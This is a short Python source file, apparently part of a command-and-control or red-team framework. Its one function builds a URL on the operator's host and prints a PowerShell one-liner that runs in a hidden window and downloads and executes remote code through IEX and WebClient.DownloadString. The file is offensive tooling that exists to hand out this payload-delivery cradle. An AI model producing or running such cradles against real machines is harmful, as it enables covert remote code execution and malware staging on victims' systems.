import socket
from core import logging
from core.config import HTTPConfig

def do_webcradle(self, command):
    """
    Prints web cradle string

    Syntax:
        webcradle secretid
    """

    identifier = command if command else 'deploy'

    url = 'http://{}/{}?{}={}'.format(socket.gethostname(), HTTPConfig.CradlePage, HTTPConfig.CradleVar, identifier)

    logging.success("Here is you one-liner:")
    logging.print('')
    logging.print('powershell -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'{}\'))"'.format(url))
    logging.print('')